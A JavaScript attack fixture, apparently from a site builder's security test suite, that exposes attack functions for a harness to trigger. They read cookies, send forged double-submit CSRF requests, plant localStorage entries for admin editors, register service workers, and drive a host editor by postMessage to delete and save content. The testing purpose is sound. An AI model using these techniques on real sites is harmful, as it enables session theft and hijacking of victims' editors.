// Attack fixture, test tooling only. Loaded on every public page through the
// site.scripts grant. The attacks are plain functions on window.__atk; the
// harness triggers them and reads the results. The attacker knows the admin
// address: the harness hands it over in the URL hash (#addr=/admin).
(() => {
  const atk = (window.__atk = { results: {}, ctl: {} });
  atk.executed = true; // AT-00 control: the grant really put this script on the page
  document.documentElement.dataset.atk = "ready";
  atk.cfg = Object.fromEntries(new URLSearchParams(location.hash.slice(1)));

  // AT-01: everything a script can read from document.cookie.
  atk.cookie = () => document.cookie;
  // Control for AT-01: the page can read a cookie it sets itself.
  atk.ownCookie = () => {
    document.cookie = "atk=1; path=/";
    return document.cookie.split("; ").includes("atk=1");
  };

  // AT-02, AT-03: a credentialed fetch of url (headers optional). Never throws.
  atk.fetchRaw = async (url, headers = {}) => {
    try {
      const r = await fetch(url, { credentials: "include", headers });
      return { status: r.status, body: (await r.text()).slice(0, 4000) };
    } catch (e) {
      return { status: 0, body: "", error: String(e) };
    }
  };

  // AT-04: only-if-cached never reaches the network; it answers only from the HTTP cache.
  atk.onlyIfCached = async (url) => {
    try {
      const r = await fetch(url, { cache: "only-if-cached", mode: "same-origin", credentials: "include" });
      return { status: r.status, body: (await r.text()).slice(0, 4000) };
    } catch (e) {
      return { status: 0, body: "", error: String(e) };
    }
  };

  // AT-05 to AT-08: load url in an iframe and report what the page can read of it.
  atk.frame = (url) =>
    new Promise((resolve) => {
      const f = document.createElement("iframe");
      f.onload = () => {
        let readable = false;
        let text = "";
        try {
          text = f.contentDocument.documentElement.outerHTML;
          readable = true;
        } catch {
          // a cross-origin or error document: the page reads nothing
        }
        resolve({ readable, text });
      };
      f.src = url;
      document.body.append(f);
    });

  // AT-10 to AT-12: a same-origin POST. token is sent both as the X-CSRF-Token header and the _csrf
  // field; null sends neither.
  atk.post = async (url, token) => {
    const headers = { "Content-Type": "application/x-www-form-urlencoded" };
    const body = new URLSearchParams();
    if (token !== null) {
      headers["X-CSRF-Token"] = token;
      body.set("_csrf", token);
    }
    try {
      const r = await fetch(url, { method: "POST", credentials: "include", headers, body, redirect: "manual" });
      return { status: r.status, type: r.type };
    } catch (e) {
      return { status: 0, error: String(e) };
    }
  };

  // AT-03b: a JSON POST with a forged double-submit CSRF pair. The page sets every CSRF cookie name
  // to the token a script can know, then echoes it in the header, the way a cookie-and-header check
  // that trusts a readable cookie would accept. body is sent as JSON.
  atk.forgedPost = async (url, token, body) => {
    for (const n of ["c", "hatamoto_csrf"]) document.cookie = `${n}=${token}; path=/`;
    try {
      const r = await fetch(url, { method: "POST", credentials: "include", headers: { "Content-Type": "application/json", "X-CSRF-Token": token }, body: JSON.stringify(body) });
      return { status: r.status, body: (await r.text()).slice(0, 500) };
    } catch (e) {
      return { status: 0, body: "", error: String(e) };
    }
  };

  // AT-13: write recovery copies into browser storage. Page scripts and the admin share one
  // origin, so this is the storage the admin editors read. Entries are [key, value] pairs.
  atk.plant = (entries) => {
    for (const [k, v] of entries) localStorage.setItem(k, v);
    return entries.length;
  };
  atk.stored = (prefix) => Object.keys(localStorage).filter((k) => k.startsWith(prefix));

  // AT-14, AT-15: register a service worker; report the outcome and every registration that exists.
  atk.registerSw = async (script, scope) => {
    const out = { outcome: "registered" };
    try {
      const reg = await navigator.serviceWorker.register(script, scope ? { scope } : undefined);
      out.scope = reg.scope;
    } catch (e) {
      out.outcome = e.name;
      out.message = String(e.message).slice(0, 200);
    }
    out.scopes = (await navigator.serviceWorker.getRegistrations()).map((r) => r.scope);
    return out;
  };
  atk.unregisterAll = async () => {
    for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister();
  };

  // AT-17: a fetch that does not follow redirects, so a 303 shows as an opaque redirect (status 0)
  // and a refusal as a 404.
  atk.fetchManual = async (url) => {
    try {
      const r = await fetch(url, { credentials: "include", redirect: "manual" });
      return { status: r.status, type: r.type };
    } catch (e) {
      return { status: -1, type: "error", error: String(e) };
    }
  };
  atk.referrer = () => document.referrer;

  // AT-09: a button the harness clicks (user activation) to open url; readOpened() reads the handle
  // later, once the harness saw the popup load.
  atk.win = null;
  atk.readOpened = () => {
    const w = atk.win;
    const out = { handle: !!w, document: "none", location: "none" };
    if (w) {
      try { out.document = w.document.body ? "readable" : "empty"; } catch (e) { out.document = e.name; }
      try { out.location = String(w.location.href); } catch (e) { out.location = e.name; }
      out.closed = w.closed;
    }
    return out;
  };
  const button = document.createElement("button");
  button.id = "atk-open";
  button.textContent = "open";
  button.addEventListener("click", () => {
    atk.win = window.open(atk.openUrl, "_blank");
  });
  document.body.append(button);

  // AT-22: inside an editor render (the builder canvas, the blog preview frame, the no-JS preview tab)
  // drive the editor that hosts this document. The script never runs there unless the product lets a
  // plugin script into editor renders, so the harness reads window.__canvasAtk only as a diagnostic.
  if (/\/edit\/preview(\/|$)/.test(location.pathname)) {
    const probe = (window.__canvasAtk = { origin: self.origin, parentRead: "none", cookie: "none" });
    try { probe.parentRead = parent.document ? "readable" : "empty"; } catch (e) { probe.parentRead = e.name; }
    try { probe.cookie = document.cookie; } catch (e) { probe.cookie = e.name; }
    const sec = document.querySelector("[data-hm-section]")?.dataset.hmSection;
    const send = (msg) => { for (const t of [parent, window.opener]) try { t?.postMessage(msg, "*"); } catch { /* no target */ } };
    setTimeout(() => send({ hm: 1, type: "hm:select", sectionId: sec }), 300);
    setTimeout(() => send({ hm: 2, type: "key", key: "Delete", shift: false }), 800);
    setTimeout(() => send({ hm: 2, type: "key", key: "s", shift: false }), 1300);
    setTimeout(() => send({ hm: 1, type: "hm:save" }), 1500);
  }
})();
